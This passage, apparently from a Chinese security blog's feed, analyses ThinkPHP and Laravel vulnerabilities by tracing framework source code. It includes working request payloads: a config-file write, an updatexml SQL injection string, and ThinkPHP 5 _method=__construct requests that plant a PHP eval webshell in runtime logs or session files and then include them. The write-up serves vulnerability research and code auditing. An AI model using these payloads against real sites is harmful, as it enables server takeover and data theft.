++++++++&#39;description%3A%E6%8F%8F%E8%BF%B0&#39;%2C%0D%0A++++++++++++++++&#39;link_id%7Cget_link%3A%E5%A4%96%E9%93%BE&#39;%2C%0D%0A++++++++++++++++&#39;update_time%7Ctime_format%3A%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4&#39;%2C%0D%0A++++++++++++++++&#39;id%3A%E6%93%8D%E4%BD%9C%3A%5BEDIT%5D%7C%E7%BC%96%E8%BE%91%2C%5BDELETE%5D%7C%E5%88%A0%E9%99%A4&#39;%0D%0A++++++++++++)%2C%0D%0A%09%09%09%09%09&amp;custom_adminlist=&amp;has_config=1&amp;config=&lt;?php phpinfo();?&gt;</code></pre><p>成功写入config.php文件，访问Addons/Example/config.php</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/8.png" alt="" loading="lazy"></p><p>所以，在TP3开发的源码中，全局查找file_put_contents很容易中奖。</p><h4 id="Auth引发的RCE"><a href="#Auth引发的RCE" class="headerlink" title="Auth引发的RCE"></a><strong>Auth引发的RCE</strong></h4><p>在tp3中，在Auth的getAuthList方法存在eval函数，跟进代码ThinkPHP\Library\Think\Auth.class.php</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/7.png" alt="" loading="lazy"></p><p>这里需要满足$command变量可控就可以rce了，$command为[表前缀]_auth_rule的condition字段，这里我还是以yershop源码来分析，控制权限的表为yershop_auth_rule。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/8.png" alt="" loading="lazy"></p><p>所以，漏洞触发需要向condition字段写入我们的恶意代码，要利用注入且支持pdo就能写入进去，tp3是以pdo来连接数据库的，这里满足了pdo，就需要寻找注入点来getshell了。</p><p>在文件Application\Home\Controller\OrderController.class.php中的detail方法，通过<strong>I</strong>方法获取id参数。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/9.png" alt="" loading="lazy"></p><p>利用pdo修改condition字段</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/10.png" alt="" loading="lazy"></p><p>继续分析，是怎么调用到getAuthList这个方法的，在Application\Admin\Controller\AdminController.class.php控制器中，调用了checkRule方法，在checkRule方法实列了Auth类，并调用了check方法。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/11.png" alt="" loading="lazy"></p><p>跟进check方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/12.png" alt="" loading="lazy"></p><p>在104行调用了我们的getAuthList方法，执行到了eval函数处。要触发rce，从代码中可以看到需要普通用户的权限才会执行到checkRule方法，所以先添加一个新用户并新增一个用户组，给它文章管理的权限。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/13.png" alt="" loading="lazy"></p><p>登录这个用户，访问我们注入修改的路由，成功rce</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/14.png" alt="" loading="lazy"></p><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h4><p>在TP3.1.3和TP3.2.3注入都差不多，无非就表达式注入，bind注入，find/select/delete注入，order注入，在之前的<a href="https://bbs.ichunqiu.com/thread-56035-1-1.html" target="_blank" rel="noopener">文章</a>中，分析过关于tp3.2.3的注入，这里我就不在多说了。这里主要是TP5的注入。</p><h5 id="ThinkPHP-lt-5-0-16-insert-update注入"><a href="#ThinkPHP-lt-5-0-16-insert-update注入" class="headerlink" title="ThinkPHP&lt;=5.0.16 insert/update注入"></a><strong>ThinkPHP&lt;=5.0.16 insert/update注入</strong></h5><p>在ThinkPHP5中，获取请求方式的方法是input，在控制器中，写个存在漏洞的demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">input</span><span class="token punctuation">(</span><span class="token string">'get.username/a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'uid'</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$username</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>漏洞payload</p><pre><code>username[0]=dec&amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]=1</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/17.png" alt="" loading="lazy"></p><p>在user变量处，断点进行分析，直接进入update方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/18.png" alt="" loading="lazy"></p><p>继续跟进$this-&gt;builder-&gt;update</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/19.png" alt="" loading="lazy"></p><p>在parseData方法中，进行了sql语句的拼接</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/20.png" alt="" loading="lazy"></p><p>当参数传入数组的时候，下标0为exp时候，直接返回下标为1的参数值，而为inc或者dec时候，通过parseKey方法处理了下标为1的参数值，跟进查看parseKey方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string">'$.'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token boolean">false</span> <span class="token operator">===</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// JSON字段支持</span>            <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$field</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'$.'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$key</span>                <span class="token operator">=</span> <span class="token string">'json_extract('</span> <span class="token punctuation">.</span> <span class="token variable">$field</span> <span class="token punctuation">.</span> <span class="token string">', \'$.'</span> <span class="token punctuation">.</span> <span class="token variable">$name</span> <span class="token punctuation">.</span> <span class="token string">'\')'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[,\'\"\(\)`\s]/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'__TABLE__'</span> <span class="token operator">==</span> <span class="token variable">$table</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'alias'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$table</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'alias'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$table</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[,\'\"\*\(\)`.\s]/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string">'`'</span> <span class="token punctuation">.</span> <span class="token variable">$key</span> <span class="token punctuation">.</span> <span class="token string">'`'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'`.`'</span><span class="token punctuation">,</span> <span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string">'`'</span> <span class="token punctuation">.</span> <span class="token variable">$table</span> <span class="token punctuation">.</span> <span class="token string">'`.'</span> <span class="token punctuation">.</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>然而parseKey并没有对传入的字符进行任何过滤，所以当输入exp，inc，dec，都返回的字符串，为什么参数值为exp的时候不能产生注入，原因是在用input方法传入的时候，要经过filterExp进行过滤</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">filterExp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 过滤查询特殊字符</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// TODO 其他安全过滤</span>    <span class="token punctuation">}</span></code></pre><p>当匹配到exp的时候，就会在exp后面添加一个空格，导致不能同parseKey方法中的exp相等。同样，利用insert方法向数据库插入数据也是同种原理。由于篇幅问题，网上的分析文章也多，之后的注入不想再造轮子了，可以详细看这个师傅的文章：<a href="https://github.com/Mochazz/ThinkPHP-Vuln。" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln。</a></p><h4 id="TP5-rce漏洞"><a href="#TP5-rce漏洞" class="headerlink" title="TP5 rce漏洞"></a><strong>TP5 rce漏洞</strong></h4><p>TP5的rce漏洞影响版本：ThinkPHP 5.0.x ~ 5.0.23、ThinkPHP 5.1.x ~ 5.1.31、ThinkPHP 5.2.0beta1</p><p>TP5rce的分析网上也比较多了，我这里有也不造轮子了，主要说下在TP渗透，php7版本的关于log文件和session文件包含的问题。</p><h5 id="runtime文件包含拿shell"><a href="#runtime文件包含拿shell" class="headerlink" title="runtime文件包含拿shell"></a><strong>runtime文件包含拿shell</strong></h5><p>先写入一句话到runtime日志中，POST发送</p><pre><code>_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;</code></pre><p>runtime的日志文件为./runtime/log/202008/17.log</p><pre><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../runtime/log/202008/17.log&amp;cmd=phpinfo();</code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/19.png" alt="" loading="lazy"></p><h5 id="session文件包含拿shell"><a href="#session文件包含拿shell" class="headerlink" title="session文件包含拿shell"></a><strong>session文件包含拿shell</strong></h5><p>写入session文件</p><pre><code>_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;&amp;server[]=1</code></pre><p>一般linux下的session文件存储在/var/lib/php/session，session的命名为sess_[PHPSESSID]</p><pre><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=/var/lib/php/session/sess_sf9vlodcl4j4r1bhli2ddnvr32&amp;server[]=1&amp;cmd=phpinfo();</code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/20.png" alt="" loading="lazy"></p><p>其实也可以用反序列化的点来，只是有点麻烦，需要去调代码。</p><pre><code>_method=__construct&amp;filter=unserialize&amp;method=get&amp;server[REQUEST_METHOD]=序列化</code></pre><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a><strong>反序列化</strong></h4><p>反序列化点通常都是在代码审计当中被发现的，当unserialize可控时可以触发，但是只光靠unserialize可控很难找到可控点，这时安全研究员<strong>Sam Thomas</strong>分享了一个关于phar反序列的漏洞，大大增加了反序列化的利用点。由于TP5-6的反序列化分析篇幅比较大，可以直接看我博客：</p><p>Thinkphp5.0.24反序列：<a href="https://jfanx1ng.github.io/2020/05/07/ThinkPHP5.0.24反序列化漏洞分析/" target="_blank" rel="noopener">https://jfanx1ng.github.io/2020/05/07/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p>Thinkphp5.1.x反序列：<a href="https://jfanx1ng.github.io/2020/05/09/ThinkPHP5.1.x反序列化链分析/" target="_blank" rel="noopener">https://jfanx1ng.github.io/2020/05/09/ThinkPHP5.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</a></p><p>Thinkphp6.x反序列：<a href="https://jfanx1ng.github.io/2020/05/13/ThinkPHP6.0反序列化漏洞分析/" target="_blank" rel="noopener">https://jfanx1ng.github.io/2020/05/13/ThinkPHP6.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p>phar反序列化挖掘案列：</p><p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=57947&amp;page=1" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=57947&amp;page=1</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Runtime日志&quot;&gt;&lt;a href=&quot;#Runtime日志&quot; class=&quot;headerlink&quot; title=&quot;Runtime日志&quot;&gt;&lt;/a&gt;&lt;strong&gt;Runtime日志&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在ThinkPHP3的版本中，入口文件index.
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Laravel APP_KEY泄露 RCE漏洞分析</title>
    <link href="http://yoursite.com/2020/08/14/LaravelAPP_KEY%E6%B3%84%E9%9C%B2RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/08/14/LaravelAPP_KEY%E6%B3%84%E9%9C%B2RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-08-13T16:00:00.000Z</published>
    <updated>2020-08-14T10:46:06.146Z</updated>
    
    <content type="html"><![CDATA[<p>laravel框架APP_KEY泄露的时候，可以通过cookie和X-XSRF-TOKEN触发反序列化漏洞，影响版本：<strong>5.5.x&lt;=5.5.40、5.6.x&lt;=5.6.29</strong></p><h4 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a><strong>环境安装</strong></h4><pre><code>composer create-project laravel/laravel laravel5629 --prefer-dist &quot;5.6.0&quot;修改composer.json中的5.6.0为5.6.29更新：composer update在routes/web.php新添加一条路由：Route::post(&#39;/&#39;, function() {return view(&#39;welcome&#39;);});</code></pre><h4 id="通过Cookie反序列化"><a href="#通过Cookie反序列化" class="headerlink" title="通过Cookie反序列化"></a><strong>通过Cookie反序列化</strong></h4><p>跟踪代码app\Http\Middleware\EncryptCookies.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Middleware</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Cookie<span class="token punctuation">\</span>Middleware<span class="token punctuation">\</span>EncryptCookies</span> <span class="token keyword">as</span> Middleware<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">EncryptCookies</span> <span class="token keyword">extends</span> <span class="token class-name">Middleware</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$except</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token comment" spellcheck="true">//</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟踪EncryptCookies的父类，vendor\laravel\framework\src\Illuminate\Cookie\Middleware\EncryptCookies.php，找到handle方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> Closure <span class="token variable">$next</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token variable">$next</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进decrypt方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>Request <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cookies</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$cookie</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isDisabled</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cookies</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decryptCookie</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">DecryptException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cookies</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$request</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里$request-&gt;cookies进行了遍历，将值传入了decryptCookie方法。继续跟进decryptCookie方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">decryptCookie</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span>        <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decryptArray</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span>        <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">encrypter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>上面判断我们传入的是否为数组，不为数组进入到decrypt，跟进vendor\laravel\framework\src\Illuminate\Encryption\Encrypter.php的decrypt方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/1.png" alt="" loading="lazy"></p><p>跟进getJsonPayload方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getJsonPayload</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">validPayload</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">DecryptException</span><span class="token punctuation">(</span><span class="token string">'The payload is invalid.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">validMac</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">DecryptException</span><span class="token punctuation">(</span><span class="token string">'The MAC is invalid.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$payload</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>我们传入的payload会解密base64，再转化为json，所以这个iv和value是我们可控的，最终就可以来到第149行进行反序列化操作了。</p><h4 id="通过X-XSRF-TOKEN头反序列化"><a href="#通过X-XSRF-TOKEN头反序列化" class="headerlink" title="通过X-XSRF-TOKEN头反序列化"></a><strong>通过X-XSRF-TOKEN头反序列化</strong></h4><p>跟踪代码app\Http\Middleware\VerifyCsrfToken.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Middleware</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Middleware<span class="token punctuation">\</span>VerifyCsrfToken</span> <span class="token keyword">as</span> Middleware<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">VerifyCsrfToken</span> <span class="token keyword">extends</span> <span class="token class-name">Middleware</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$except</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟踪VerifyCsrfToken的父类，vendor\laravel\framework\src\Illuminate\Foundation\Http\Middleware\VerifyCsrfToken.php，找到handle方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> Closure <span class="token variable">$next</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isReading</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">runningUnitTests</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">inExceptArray</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">tokensMatch</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addCookieToResponse</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token variable">$next</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TokenMismatchException</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>继续更进tokensMatch方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">tokensMatch</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTokenFromRequest</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">)</span> 